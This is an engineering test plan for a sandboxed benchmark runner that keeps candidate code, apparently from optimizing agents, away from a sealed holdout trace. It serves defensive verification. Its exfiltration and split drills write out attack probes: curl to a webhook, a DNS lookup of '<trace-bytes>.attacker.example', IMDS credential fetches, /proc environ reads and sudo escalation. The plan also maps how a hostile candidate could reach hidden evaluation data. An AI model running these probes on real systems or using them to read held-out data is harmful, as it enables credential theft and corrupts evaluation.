# Real-environment test plan: trusted bench

Scope: `@ratchet/bench` (`LocalBenchRunner`, `RemoteBenchRunner`, `BenchQueue`, `evaluateCandidate`).
Unit and integration tests run the pipeline on one machine; nothing in them proves the numbers are
stable on the pinned instance, that the generated scripts survive real SSM, or that candidate code
cannot reach the hidden trace. This plan does that. Run it after `aws.md` (sandbox, identities) and
before `agents.md` / `engine.md`.

## 1. What runs where

One bench job (`BenchJob`: `baseline`, `bench` or `confirm`) is the same pipeline in both runners
(`src/pipeline.ts`); only the executor differs:

```
checkout candidate sha + bench.ref  ->  protected overlay  ->  setup  ->  command guardrails (fail fast)
  ->  bench.run x job.repeats  ->  threshold guardrails over the per-metric medians
```

| | `LocalBenchRunner` | `RemoteBenchRunner` |
|---|---|---|
| Used for | simulation mode, `ratchet bench`, development | live mode |
| Where candidate code runs | this machine, current user, current env (**not a security boundary**) | a fresh bench instance per job (`CloudCompute.launchBenchInstance`, private subnet with no internet route). Setup, guardrails and candidate processes run as the unprivileged `ratchet-bench` OS user; the evaluator harness (`bench.run`) runs as a second unprivileged user, `ratchet-holdout`. Terminated in a `finally` |
| Checkout | `GitHost.checkout(sha)` and `GitHost.checkout(bench.ref)`, `.git` removed | **pre-staged**: the controller materializes both trees (`GitHost.resolveRef` + `checkout`), uploads them as `code.tgz` / `bench.tgz` under `bench-inputs/<opt>/<job>/` in the artifacts bucket, and the instance downloads them from S3 (sha256 verified). No git, no GitHub, no token on the instance |
| Steps | child processes in their own process group | one generated bash script per step through `CloudCompute.runCommand` |
| Abort | `AbortSignal` kills the process groups | `AbortSignal` stops waiting and terminates the instance |

Failure model: a candidate that breaks a gate (setup, a command guardrail, a bench run, a threshold)
yields a `BenchOutcome` with a failed `GuardrailResult`; `evaluateCandidate` turns that into
`blocked`. Infrastructure problems (checkout fails, `bench.ref` has no protected files, instance never
registers with SSM, confirm job without a trace) throw `BenchError`; an abort throws an `AbortError`.

### The protected-path rule (what comes from `bench.ref`)

A path is *protected* iff it matches a glob in `ratchet.yaml` `protected:` (core's `matchesGlob`; the
remote scripts use the same glob-to-regex translation through `grep -P`, and a test checks the two agree).
Protected paths always come from `bench.ref`, never from the candidate:

1. every file or symlink in the `bench.ref` tree that is protected overwrites the candidate's version
   (and replaces whatever the candidate has there: a directory, a symlink);
2. with `pruneExtraProtected` (default **on**) every protected file the candidate has that `bench.ref`
   does not is deleted. This assumes `bench.ref` is a full snapshot (baseline plus the trusted bench),
   which is how the demo is set up; with a bench.ref holding only `bench/`, set it off or `tests/contract/**`
   would be deleted;
3. the copy never follows symlinks: an ancestor that is a symlink or file in the candidate tree is
   removed and replaced by a real directory first;
4. if `bench.ref` contains **no** protected file the job fails (`BenchError`): an empty trusted bench
   means the candidate would be scoring itself;
5. before **every** later step (setup, each guardrail, each bench run) the protected files are compared
   with `bench.ref`'s. If a build step, a test or a previous bench run modified one, it is restored, the
   step is not run, and the job ends with a failed `protected files intact` guardrail (verdict `blocked`).

Not covered, by design: the `protected` list is also checked on the diff by the engine
(`changedFiles` + `findProtectedViolations`), which is what reports *which* committed path was touched.
The overlay is the second line. It does not make an unprotected path trusted: if `bench.run` reads
`tools/load.mjs` and `tools/**` is not in `protected`, the candidate controls the bench. Review the
`protected` list against everything `bench.run` executes or reads. The setup command is candidate-
influenced (it runs `pnpm build` on candidate code), so generated output (`dist/`) is only as trustworthy
as the build; prefer a bench that runs from protected sources (k6 scripts) over a compiled one.

### Environment contract for `bench.run`

Every step gets: `RATCHET_PHASE` (`baseline|bench|confirm`), `RATCHET_SHA`, `RATCHET_OPTIMIZATION`,
`RATCHET_REPEATS`; bench runs also `RATCHET_RUN` (1-based). **`RATCHET_TRACE`** is set for
`confirm` bench runs only, to the hidden trace (`job.trace`, falling back to `bench.confirm_trace`):

- local runner: a local path is made absolute; URLs are passed through unchanged;
- remote runner: an `s3://` URI is downloaded by the instance (`aws s3 cp`, as root) **inside each confirm bench
  run, after setup and guardrails**, to `<work>/holdout/trace.<ext>` (mode 0600, owned by `ratchet-holdout`, directory
  0700) and `RATCHET_TRACE` is that local path **for the harness only**. The file is wiped when the run ends (also if
  the run crashes or times out). Candidate processes never get `RATCHET_TRACE` (see "The harness / candidate split").

Output contract: the last JSON object on stdout; `objective.metric` is read by dotted path; every other
numeric leaf is flattened to a dotted key and stored as `BenchRun.metrics` (arrays and strings are
skipped). Threshold guardrails use the median of each metric over the runs and look the metric up by
exact key, then with a unit suffix (`peak_rss` finds `peak_rss_mb`, as in the demo). Relative bounds
(`< 1.2x`) need the baseline's `metrics` (`medianMetrics(baselineOutcome.runs)` or `metricsFromStats`);
without one they fail, except in the `baseline` phase where they are reported as skipped.

Command guardrails run in the `bench` and `baseline` phases and are skipped in `confirm` (set
`commandGuardrailsInConfirm` to run them there too). They fail fast: the first failure stops the job
before any bench time is spent.

### Remote protocol (what to look at when it breaks)

Before any command the controller stages the candidate and `bench.ref` (see `stage.ts`). Steps are
separate `runCommand` calls: `ping` (retried while SSM registers), `checkout` (download, verify,
overlay, check the isolation), `setup`, `guardrail i/n`, `bench run i/n` (in a confirm job each bench run
fetches and wipes the holdout itself; there is no separate trace step and the sealed bucket is not contacted
before the first bench run). Each script is wrapped so it runs under bash even
if the SSM document uses `sh`. Results come back as sentinel lines `@@RATCHET@@ <kind> <json>` on
stdout; SSM returns at most about 24,000 characters per command, so the bench JSON travels as the last
12,000 bytes of stdout, base64 encoded, one command per run. Consequences: the stored log has only
output tails for remote runs (full output stays on the instance in `<work>/logs/` until it is terminated),
and a bench whose final JSON object is larger than 12 kB will not parse. Requirements on the AMI: bash,
tar, GNU coreutils (`timeout`, `realpath -m`, `date +%s%N`, `sha256sum`), GNU findutils (`find -printf`),
GNU grep with `-P`, util-linux `setpriv`, `pkill`, `iptables` and `sudo` (the instance user-data installs the rules, the launcher and the sudo rule), `shred` and `cp --reflink`,
the `aws` CLI (staged archives and `s3://` traces), plus the repo's toolchain (node, pnpm, k6),
installed world-readable and executable (the bench runs as an unprivileged user, so nothing under `/root`).
`git` is **not** needed on the bench instance any more.

## 2. Noise on pinned hardware (PLAN spike B)

Goal: pick `repeats` and `min_gain` from measurement. The rule is
`improvement > max(noise_floor, min_gain * best)` with `noise_floor = 2 * stddev(baseline runs)`
(`noiseFloor()` in core). The floor uses the spread of *single runs*, so more repeats make the median
more reliable but do **not** lower the floor; only less noisy runs do.

Setup: a dedicated `c7i.2xlarge` (Dedicated Host or dedicated tenancy) in one AZ, the bench AMI,
nothing else running, load generator and target on the same instance as in production. Let the
instance sit for a few minutes after boot.

Procedure:

1. **Baseline noise.** 10 consecutive baseline runs of the demo's base commit, with the production
   `bench.run` (60 s + 5 s warmup):
   `RemoteBenchRunner.run({ phase: 'baseline', repeats: 10, ... })`, or on the instance
   `ratchet baseline --repeats 10 --json`. Record the 10 samples of `http_req_duration.p95`, `p50`, `rps`,
   `peak_rss_mb`; compute median, stddev and **CV = stddev / mean** (`summarize()` in core).
2. **Read the CV** (reference: the demo README measured about 11% on a shared 4-vCPU container, p95 is
   dominated by queueing behind occasional slow requests):

   | CV of p95 | What it means | Action |
   |---|---|---|
   | <= 1.5% | `2 * CV <= 3%`: `min_gain: 0.03` is the binding limit | `repeats: 3` to `5` |
   | 1.5% to 4% | the noise floor (`2 * CV`, 3% to 8%) is the binding limit; smaller gains cannot be seen | `repeats: 5`; set `min_gain` to about `2 * CV` so the config tells the truth; or reduce noise first |
   | > 4% | wins below 8% are invisible | reduce noise (below) and re-measure before using this bench |

   Target for v0: CV <= 2% (visible gains from about 4%).
3. **If it is too noisy**, change one thing at a time and repeat step 1: longer duration (120 s), longer
   warmup, a lower arrival rate (stay below saturation so latency is not queueing), pin the server and
   the load generator to disjoint cores (`taskset -c`), stop everything else (cron, SSM agent updates,
   `unattended-upgrades`), compare p50 against p95 (p99 is noisier still), confirm the instance is not
   throttled (`c7i` has no burst credits; check steal time in `mpstat`).
4. **A/A check.** Run 20 *distinct jobs* for the same unchanged sha through the full bench phase
   (`evaluateCandidate` with `currentBest` = the baseline median and `noiseFloor` from step 1). Expect 0
   `pending_confirm` / `verified`. Any hit means the floor is too low for the real variance.
5. **A/B power check.** Apply known changes (one planted problem from the demo's `SOLUTIONS.md` removed;
   a synthetic 3%, 5%, 10% change such as a calibrated `setImmediate` busy-wait) and see which are
   detected. `min_gain` should be about the smallest change that is detected in at least 9 of 10
   attempts.
6. **Write it down**: copy `repeats`, `min_gain`, the 10 samples and the CV into the repo's
   `ratchet.yaml` comments and the ledger baseline. Re-measure after any AMI, kernel or instance-type
   change.

Pass: CV recorded, A/A produces no false win in 20 jobs, the chosen `min_gain` is detected in A/B.

## 3. Confirm run and the sealed bucket

Flow for a candidate that wins the bench phase (`evaluateCandidate` returns `needsConfirm: true`):

1. Engine submits a `phase: 'confirm'` job (`trace` = the sealed object under the holdout prefix, e.g.
   `s3://<sealed>/holdout/demo-search-trace.json`, or omit it to use `bench.confirm_trace`). A new instance is
   launched for it, so the confirm is on fresh hardware by construction.
2. **The profile follows the phase** (`AwsCloudCompute.launchBenchInstance` -> `benchProfileFor`): `baseline` and
   `bench` instances get `eval_identity_ref` (the `bench_runner` role: reads `bench-inputs/`, writes
   `bench-results/`, **no sealed access**, and the sealed bucket policy denies it explicitly); only `confirm`
   gets `confirm_identity_ref` (the `confirm_runner` role: the same plus `s3:GetObject` on
   `<sealed>/<sealed_confirm_prefix>*`, default `holdout/`). A missing confirm profile makes the launch fail
   instead of falling back to the bench profile.
3. The holdout is fetched by **root, inside each bench run, after the build has finished** (setup and guardrails ran
   without it existing on the instance). See "The harness / candidate split" below for who can read it.
   Threshold guardrails (error rate, peak RSS against the baseline) are evaluated on the confirm runs.
4. The engine calls `evaluateCandidate({ bench, confirm, confirmBest, ... })`. `confirmBest` must be
   the current best's value **on the hidden trace**; the engine gets it by running the baseline (and
   each new best) once in the confirm phase. Without it core falls back to `currentBest`, which is only
   right if bench and trace share a scale.
5. The instance is terminated; the trace file never leaves it (and is wiped after every run). Only numbers are returned, and the stored log of a holdout run omits the harness's output tails.

Checks:

- [ ] Trace generated with a seed the agents never saw (`bench/traces/generate.ts --seed <hidden>`),
      uploaded under the holdout prefix of the sealed bucket by an admin identity; agents' roles get
      `AccessDenied` on it (this is also `aws.md` territory; repeat it from a runner here).
- [ ] **Profile split**: `aws ec2 describe-instances` on a `baseline`/`bench` instance shows the
      `...-bench-runner` profile, a `confirm` instance the `...-confirm-runner` profile; from a `bench`
      instance (as root) `aws s3 cp s3://<sealed>/holdout/<trace> -` fails `AccessDenied` (identity policy has
      nothing, and the bucket policy denies the role); from a `confirm` instance it works, but
      `s3://<sealed>/other/x` and `aws s3 ls s3://<sealed>/` (no prefix) fail.
- [ ] A confirm job with `s3://` trace: the stored log shows `holdout: <n> bytes fetched for this run` per bench run, with `n`
      equal to the object size; bench output shows the workload from the trace (request count differs from the bench phase).
- [ ] A bench-phase job never has `RATCHET_TRACE` (bench output / `env` dump in a test bench), and its SSM command
      history (`aws ssm list-command-invocations --details`) contains no `aws s3 cp` of the sealed bucket.
- [ ] The split drill below (all of it) passes on a real confirm instance.
- [ ] `confirmBest` flow: baseline measured on the trace once, a candidate that beats the bench mix but
      regresses on the trace ends `failed_confirm`.

### Trust gaps and what closes them

The candidate's server and the evaluator harness run on the **same instance**. Candidate code can try to read
`RATCHET_TRACE` and the trace file, fetch instance-profile credentials from IMDS and read the sealed bucket
directly, or send what it finds out over any allowed egress (including DNS). Status of the five mitigations from the review:

| # | Gap | Status | Where |
|---|---|---|---|
| 1 | Egress lockdown | **Closed in code** (verify for real, below) | `infra/aws/network.tf`: dedicated VPC, bench subnet without a default route, bench SG egress only to itself / endpoint SG / S3 prefix list / DNS; `infra/aws/dns_firewall.tf`: the resolver answers NXDOMAIN outside an allow-list |
| 2 | Split identities by phase | **Closed in code** | `bench_runner` vs `confirm_runner` roles (`infra/aws/iam.tf`), `AwsCloudCompute.launchBenchInstance`, explicit sealed-bucket deny for `bench_runner` |
| 3 | IMDS | **Closed in code, depends on the image** | launch: IMDSv2 required, hop limit 1; `benchUserData`: iptables owner rule rejecting 169.254.169.254 for `ratchet-bench` and `ratchet-holdout`; `checkoutScript` verifies the rules *and* probes them as those users, refusing the job otherwise |
| 4 | Separate users | **Closed in code, depends on the image** | candidate = `ratchet-bench`, harness = `ratchet-holdout`, holdout `0600` owned by the harness user and fetched only after the build; candidate processes are started through a launcher with a clean environment; leftovers of both users killed between steps. Limits in "The harness / candidate split" |
| 5 | One job per instance | Closed (already) | `RemoteBenchRunner` launches and terminates per job |

### The harness / candidate split

Two principals on a bench instance, because "candidate code and the holdout share a user" was the largest hole:

| | `ratchet-bench` (candidate) | `ratchet-holdout` (evaluator harness) | root (SSM) |
|---|---|---|---|
| Runs | `setup`, command guardrails, every process the harness launches through `$RATCHET_CANDIDATE_EXEC` | `bench.run` (k6, a load generator, a backtest runner), in confirm and in every other phase | the generated scripts: staging download, overlay check, snapshot, holdout fetch, wipe |
| Code it runs | the candidate's tree (`<work>/code`), `--no-new-privs` for setup/guardrails | a **root-owned read-only snapshot** of that tree (`<work>/harness`), taken once right before the first bench run, after the protected-file check | n/a |
| Holdout | cannot list or open `<work>/holdout` (0700, owned by the harness user); never in its environment | the only reader (file 0600, `RATCHET_TRACE` in its environment) | fetches it, hands it over, wipes it |
| Credentials | IMDS rejected by iptables (uid owner rule), `AWS_*` scrubbed | same | holds the instance profile |
| Extra privilege | none | exactly one sudo rule: run `/usr/local/sbin/ratchet-candidate-exec` as `ratchet-bench` | all |

How the pieces fit:

- **Fetch after the build.** `setup` and the guardrails (the only steps that run arbitrary candidate build and test
  code before the benchmark) execute while no sealed object exists on the instance. The confirm bench step fetches the
  holdout (`aws s3 cp` as root), makes it `ratchet-holdout:` 0600, runs the harness, kills both users' processes, then
  wipes it (`shred -u`, plus an `EXIT` trap). The sealed bucket is contacted from exactly one place: a bench step of a
  confirm job. A candidate cannot read the file "ahead of time" because it does not exist during anything it runs
  before, and it cannot read it during the run because it is the wrong user.
- **Snapshot.** The harness executes from a root-owned, read-only (`chown -hR root:root`, `go-w`, setuid bits stripped) copy of
  the tree. The candidate owns `<work>/code` and can change it at will, including files the harness would otherwise load
  mid-run; it cannot change the snapshot. Files the harness executes should be in `protected` (restored from `bench.ref`
  before the snapshot is taken).
- **Launcher.** The harness starts candidate processes with `$RATCHET_CANDIDATE_EXEC [NAME=value ...] <command> [args]`
  (`/usr/local/bin/ratchet-candidate`, a wrapper around `sudo -n -u ratchet-bench /usr/local/sbin/ratchet-candidate-exec`).
  The command runs in the candidate's checkout with `env -i` (so no `RATCHET_TRACE`, no `AWS_*`, own `HOME`/`TMPDIR`);
  a `RATCHET_TRACE=` or `AWS_*=` argument is refused. stdin/stdout/stderr are the caller's, so a harness can pipe data to
  and from a candidate. **Give the candidate pipes or `ignore`, never the harness's own stdout**, which carries the result.
  `RATCHET_CANDIDATE_EXEC` is unset in `isolation: 'none'`, in simulation and under `LocalBenchRunner`; a harness must then
  spawn the process directly (this is what `examples/demo-search/bench/local.ts` does).
- **Output.** The harness's working directory is the read-only snapshot, so it cannot write next to its script: print the result JSON on stdout (what the pipeline parses; for k6, return `{ stdout: JSON.stringify(result) }` from `handleSummary`) or write under `RATCHET_OUT_DIR`, a directory it owns. `HOME` and `TMPDIR` are its own too.
  The stored log of a holdout run omits the harness's stdout and stderr tails; the numbers still come back.
- **Fail closed.** `checkout` refuses to start the candidate (exit 12 to 19) if a user is missing, IMDS is reachable as either user,
  the launcher does not answer as `ratchet-bench` when called as `ratchet-holdout`, the holdout directory is readable by the
  bench user, or it is not readable by the harness user. These are real probes, run as the two users.

**What this does not stop, and what a pack must do about it:**

1. **An evaluator that imports candidate code in-process cannot be protected.** If `bench.run` loads candidate code into its own
   process (the forecasting backtest imports the model), that code runs as `ratchet-holdout` and can open the holdout. The same
   holds for any non-`protected` file the harness executes (a compiled `dist/bench/local.js` is built by the candidate's own
   `pnpm build`). Packs must (a) keep everything the harness executes inside `protected` paths, not generated by `setup`, and
   (b) talk to the candidate across a process boundary: start it with `$RATCHET_CANDIDATE_EXEC`, send inputs over HTTP/stdin,
   read predictions back, and keep the labels / actuals / held-out partition on the harness side. For the forecasting pack
   that means a `backtest` runner that spawns the model as a subprocess, sends it the training weeks and compares its forecasts
   with the sealed actuals itself. Until a pack does this, treat its confirm as protecting against accidents and overfitting,
   not against a hostile candidate.
2. **The candidate sees what the harness sends it.** A replayed traffic trace reaches the server request by request; a model
   receives its training data. The split protects the part of the holdout that is never sent (the full trace, future requests,
   the labels), not what a fair evaluation must reveal. Replaying a trace the candidate can learn mid-run is also a way to
   memorize it within the run; the instance is fresh per job, so nothing carries over.
3. **The result channel.** Metrics are produced by the harness (not by candidate stdout), so the channel is only what the
   candidate can influence: latencies, error counts, a crash. Bandwidth is tiny but not zero; keep metrics aggregate and rounded.
4. **Root escape and the sudo rule.** A kernel or sudo bug reaches root, which holds the holdout and the instance credentials.
   The rule is one fixed script, no `SETENV`, no wildcards in the path, run as an unprivileged target, and `ratchet-bench` itself
   has no sudo rights. The harness cannot use `--no-new-privs` (sudo needs setuid), so the AMI must have no other setuid binary
   worth attacking: strip them (`find / -xdev -perm /6000`).
5. **The harness is trusted.** It is code from `bench.ref`; a harness that writes the holdout somewhere the candidate can read, or sends
   it to the candidate, defeats the split.

Also not solved by any of this (accept or fix before a hostile agent):

- **DNS** is closed by the DNS Firewall (section 4), but only as far as the allow-list: an allowed name is not a channel to an
  attacker (AWS answers it), a new name in `dns_firewall_extra_domains` might be.
- **Credentials on the instance** are `bench_runner` (non-confirm) or `confirm_runner`; both can write
  `bench-results/*`, so a root compromise can forge results for any optimization.
- Timing side channels and the bench's own HTTP traffic between server and load generator are out of scope.

Exfiltration drill (run it, do not assume it): a candidate whose server tries (a) `curl https://example.com`,
(b) `aws s3 ls` / `aws s3 cp s3://<sealed>/...` using IMDS credentials, (c) reading the trace file, `/proc/<harness>/environ`
and `/proc/<harness>/fd/*`, (d) `curl` to a webhook with the trace, (e) `curl http://169.254.169.254/latest/meta-data/`
and `PUT /latest/api/token`, (f) `sudo`/`su`/a setuid binary, (g) a DNS lookup of `<trace-bytes>.attacker.example`,
(h) editing the files the harness runs (`bench/**`, the snapshot) and its own `dist/`, (i) calling the launcher
itself and `sudo -l`. In `bench` phase (a) to (i) must fail or be harmless. In `confirm` phase the same, and (c) must fail
for the trace file *and* for the credentials. (g) must return NXDOMAIN (DNS Firewall).

Split drill, by hand on a real confirm instance (`aws ssm start-session` or a held-open job):

```sh
W=/var/tmp/ratchet-bench/<job>        # while a bench run is in flight (use a bench command that sleeps)
ls -ld $W/holdout $W/holdout/*        # drwx------ ratchet-holdout, -rw------- ratchet-holdout
sudo -u ratchet-bench cat $W/holdout/trace.json                  # Permission denied
sudo -u ratchet-bench ls $W/holdout                              # Permission denied
sudo -u ratchet-holdout cat $W/holdout/trace.json                # content (the harness user)
sudo -u ratchet-holdout /usr/local/bin/ratchet-candidate id -un  # ratchet-bench
sudo -u ratchet-holdout env RATCHET_TRACE=$W/holdout/trace.json /usr/local/bin/ratchet-candidate sh -c 'echo ${RATCHET_TRACE:-unset}'   # unset (launcher env -i)
sudo -u ratchet-holdout /usr/local/bin/ratchet-candidate RATCHET_TRACE=x id   # refused (exit 78)
sudo -u ratchet-holdout sudo -n -u root id                       # a password is required
sudo -u ratchet-bench sudo -n -l                                 # not in the sudoers file
sudo -u ratchet-bench sh -c 'echo x >> $W/harness/bench/k6/search.js'          # Permission denied (snapshot)
sudo -u ratchet-bench sh -c "kill -0 $(pgrep -u ratchet-holdout -n)"           # Operation not permitted
sudo -u ratchet-bench cat /proc/$(pgrep -u ratchet-holdout -n)/environ         # denied (and hidepid=2 hides it)
sudo -u ratchet-holdout curl -m 3 http://169.254.169.254/latest/meta-data/     # fails (iptables)
# after the run:  ls $W/holdout  -> empty; grep -r <a distinctive trace substring> $W /var/tmp /tmp  -> nothing
find / -xdev -perm /6000 -type f 2>/dev/null                    # the AMI's setuid list: only sudo (and what you accept)
```

Then the in-band checks: a candidate that overwrites its own `dist/` or a file the harness would load gets no effect on the score;
a candidate whose build script waits for `/var/tmp/.../holdout/trace*` (a `postinstall` that polls) never sees it.

## 4. Egress lockdown

What `infra/aws` builds (all in the module, no manual steps):

- A **dedicated VPC** (`vpc_cidr`, default `10.42.0.0/16`). The account's default VPC is never used.
- **Bench subnet**: associated with a route table that has only the implicit local route. No NAT gateway, no
  internet gateway route.
- **S3 gateway endpoint** on that route table, with an endpoint policy that admits only the artifacts and
  sealed buckets (an unrestricted endpoint would let a process write to its own bucket).
- **Interface endpoints** for `ssm`, `ssmmessages`, `ec2messages` and `logs` (private DNS on), behind a
  security group that accepts 443 only from the bench and agent subnets.
- **Bench security group**: ingress only from itself; egress to itself, to the endpoint security group on 443,
  to the S3 prefix list on 443, and DNS. There is no `0.0.0.0/0` rule and `bench_egress_cidrs` is gone.
- **DNS Firewall** (`dns_firewall.tf`, `enable_dns_firewall`, default on): security groups do not filter queries to the
  VPC resolver, so a rule group on the VPC answers NXDOMAIN for every name outside an allow-list (regional `ssm`,
  `ssmmessages`, `ec2messages`, `logs`, S3 names; the VPC's `*.ec2.internal` / `*.<region>.compute.internal` and
  reverse names; the agent domains and `dns_firewall_extra_domains`). It is per VPC, so it covers agent runners too
  (see `aws.md` section 10 for why the bench is not in a VPC of its own). It fails closed.
- The candidate arrives as a staged archive in S3 (above); GitHub is not in the allowed set, so it is no
  exfiltration channel.
- Setup needs packages (`pnpm install`): bake `node_modules`/the store into the AMI and run
  `pnpm install --offline --frozen-lockfile`. Do **not** reopen the internet for setup; if you must, run
  setup in a separate, earlier instance and ship the result (not done today).

Pass criteria, on a real bench instance (via SSM):

- [ ] `curl -m 5 https://example.com`, `https://github.com` and `https://s3.amazonaws.com` (no endpoint
      match) fail, as root, as `ratchet-bench` and as `ratchet-holdout`.
- [ ] **DNS Firewall:** `getent hosts example.com`, `getent hosts abc123.attacker.example` and `dig +short TXT x.example.org`
      return nothing / NXDOMAIN (as root and as both users); `getent hosts ssm.<region>.amazonaws.com`,
      `s3.<region>.amazonaws.com` and `<artifacts bucket>.s3.<region>.amazonaws.com` resolve (to the private endpoint
      addresses for ssm; `ssm`/`logs` must NOT resolve to public IPs). SSM Run Command and `aws s3 cp` still work.
      `aws route53resolver list-firewall-rule-group-associations` shows the VPC with status `COMPLETE`; turning the rule
      group off (`-var enable_dns_firewall=false`, in a scratch sandbox only) makes `getent hosts example.com` resolve
      again, which proves the block is the firewall and not a missing network path.
- [ ] `aws ssm get-parameter` is not needed; SSM Run Command works (this is the only control channel),
      and `aws s3 cp s3://<artifacts>/bench-inputs/... .` works from the instance.
- [ ] `aws s3 cp x s3://<some-other-bucket>/` fails even with credentials that would allow it elsewhere
      (endpoint policy); `aws s3 ls s3://<artifacts>/artifacts/` fails (identity policy).
- [ ] `ip route` shows no default route; `aws ec2 describe-route-tables` for the bench subnet has no `0.0.0.0/0`.
- [ ] From an agent runner: connecting to a bench instance's ports fails (no inbound from agents).
- [ ] An agent role cannot `run-instances` into the bench subnet or with the bench/endpoint/proxy security
      groups (explicit deny; see `aws.md` section 3).
- [ ] A full bench + confirm job succeeds end to end.

## 5. Live smoke checklist for `RemoteBenchRunner`

Run against a real instance with a throwaway repo first, then `examples/demo-search`.

- [ ] Staging: `bench-inputs/<opt>/<job>/{code,bench}.tgz` appear in the artifacts bucket before the instance
      is used; an agent role cannot read or overwrite them (`AccessDenied`); the instance's `checkout` output
      reports `"isolation":"user"`; a hand-edited object (same key, other bytes) fails with `sha256 mismatch`.
- [ ] Isolation refusal: on an AMI without the `ratchet-bench` or `ratchet-holdout` user, or with either iptables rule removed
      (`iptables -D OUTPUT ...`), or without the launcher / sudo rule (`rm /etc/sudoers.d/ratchet-holdout`), the job fails in
      `checkout` (exit 12/13/14/18) and the candidate never runs.
- [ ] `launchBenchInstance` -> `ping` succeeds within `readyAttempts * readyDelayMs`; tune the defaults
      (30 x 10 s) to the real SSM registration time.
- [ ] Staging of a private repo works: the **controller's** `GitHost` (token on the Mac, not on the instance)
      materializes `sha` and `bench.ref`; a sha that is not a branch tip works (`resolveRef` + `checkout`).
      `tar` archives with symlinks and the executable bit survive the round trip (compare `find -ls` of a
      checkout with the repo).
- [ ] `grep -P`, `realpath -m`, `timeout -k`, `date +%s%N`, `find -printf`, `sha256sum`, `setpriv`, `pkill`,
      `iptables`, `sudo`, `shred` exist on the AMI; the toolchain is runnable by both users (`sudo -u ratchet-bench node -v`,
      `sudo -u ratchet-holdout k6 version`); `cp -a --reflink=auto` of a real `node_modules` finishes in seconds (the snapshot is
      taken once per job, before the first bench run).
- [ ] Output limit: a bench that prints 5 MB of logs still parses (only the stdout tail travels);
      `runCommand` does not throw on large output; stored log shows the tails.
- [ ] Timeouts: `timeoutSeconds` (step timeout + 120 s) is honoured by the real `runCommand`; a hung
      bench is killed by the in-script `timeout -k 10` and reported as `timed out after ...ms`.
- [ ] Abort mid-run terminates the instance within seconds and `listTagged` shows no leftover.
- [ ] A failing `terminate` raises `onWarning`, and the reaper picks the instance up.
- [ ] Tamper drills on the instance: a candidate whose `pnpm build` rewrites `bench/*` ends `blocked`
      with `protected files intact`; a candidate that replaces `bench` by a symlink to `/` does not
      change files outside the checkout; the score is the one from `bench.ref`.
- [ ] Cost: each job pays instance start-up (about 1 to 2 minutes with SSM registration) plus setup;
      measure it, decide whether to keep a warm pool (not implemented, and a warm instance reused across
      candidates weakens the isolation above).

## 6. What is mocked in the automated tests

| Real thing | Test stand-in | What that does *not* prove |
|---|---|---|
| EC2 bench instance + SSM `RunShellScript` | `LocalFakeCompute`: runs each generated script with local `bash`, truncates stdout to 24,000 characters, an `aws` shim copies `s3://b/k` from a directory | SSM latency and registration, the document's shell, real command timeouts and polling, IAM, IMDS, security groups and endpoints, AMI contents; `terminate` there kills the process tree, which a real termination does by destroying the machine |
| GitHub / git remote | `LocalGitHost` (`git archive` of a local repo) feeding `stageSource`; the staging store is a directory the `aws` shim reads | auth, rate limits of the real `GitHubGitHost`, real S3 puts, the instance-side download through the gateway endpoint |
| Unprivileged users, IMDS block, launcher | `setpriv`/`iptables`/`pkill`/`chown`/`id` and the launcher are shims that log their arguments (`isolation: 'user'` tests); most tests run `isolation: 'none'`. The sudo rule, launcher and file modes were run once by hand on a real Linux host (users, `sudo`, `setpriv`), not in CI | that the users, the iptables rules, the sudoers rule and the launcher exist on the image, that the rule really rejects IMDS for those uids, that `setpriv --no-new-privs` blocks escalation, that the toolchain is usable by both users, that the real kernel denies the cross-user reads (run the split drill) |
| Hidden trace in the sealed bucket | a local file / shimmed `s3://` path; the tests check order (fetch only in confirm bench steps, after setup and guardrails), wiping on success, crash and timeout, and the generated modes (`chown HU`, `chmod 600`) | bucket policy, KMS, that agents cannot read it, that the real file modes keep `ratchet-bench` out |
| k6 | not used; the demo test runs `node dist/bench/local.js --duration 3 --warmup 1` | k6 JSON output (`RESULT_FILE`) and the k6 script's own contract |
| Noise | tests assert logic, not variance | everything in section 2 |

Automated coverage that does exist: both runners against the same scenarios (guardrail failure before
the bench, protected overlay incl. symlink attack and tamper detection, repeats, metric flattening,
threshold guardrails vs baseline, confirm trace env, abort, timeouts, setup, partial failures), the
queue (serialization, round-robin fairness, cancellation, events), `evaluateCandidate`, and a real run
on a copy of `examples/demo-search` (about 20 s).

Manual command for the demo integration (what `src/integration.test.ts` automates; skip it with
`RATCHET_SKIP_DEMO=1`):

```sh
cp -r examples/demo-search /tmp/demo && cd /tmp/demo && rm -rf dist node_modules
git init -q && git add -A && git commit -qm base && git branch ratchet/bench
tsc -p tsconfig.build.json   # needs ../../tsconfig.base.json next to it, see the test
node dist/bench/local.js --duration 3 --warmup 1 --port 4123
```
